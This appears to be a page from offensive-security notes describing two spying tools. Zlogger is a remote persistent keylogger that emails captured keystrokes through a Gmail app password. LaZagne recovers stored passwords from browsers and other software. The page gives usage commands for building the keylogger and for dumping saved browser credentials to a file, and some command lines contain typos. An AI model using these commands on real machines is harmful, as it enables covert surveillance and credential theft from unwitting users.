# Spying Software

## Zlogger

* Remote persistent keylogger for **Windows** and **Linux**.
* Before start go to your google account and go to the google sign in section and click on app passwords, generate an app password.
* Copy that password to auth with the program.

### Usage



{% tabs %}
{% tab title="Windows" %}
zlogger -i 60 --windows -e 'test@email' -p 'password' -o \<output\_filename>'
{% endtab %}

{% tab title="Linux" %}
zlogger -i 60 --linux -e -e 'test@email' -p 'password -o \<output\_filename>
{% endtab %}
{% endtabs %}

{% embed url="https://github.com/z00z/ZLogger" %}

## LaZagne

* The **LaZagne project** is an open-source application used to **retrieve lots of passwords** stored on a local computer.
* Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.).
* This tool has been developed for the purpose of finding these passwords for the most commonly used software.
* **LaZagne** have's different modules to target programs, browsers, etc.

<figure><img src="https://user-images.githubusercontent.com/10668373/43320585-3e34c124-91a9-11e8-9ebc-d8eabafd8ac5.png" alt=""><figcaption></figcaption></figure>

### Usage

```java
./LaZagne.exe browsers -oN <output_file_with_recovered_passwords>
```

* Here we are getting all saved passwords on the browsers using the browser module.
* There are a lot more modules to try, you can see it in the **LaZagne** repository.

{% embed url="https://github.com/AlessandroZ/LaZagne" %}
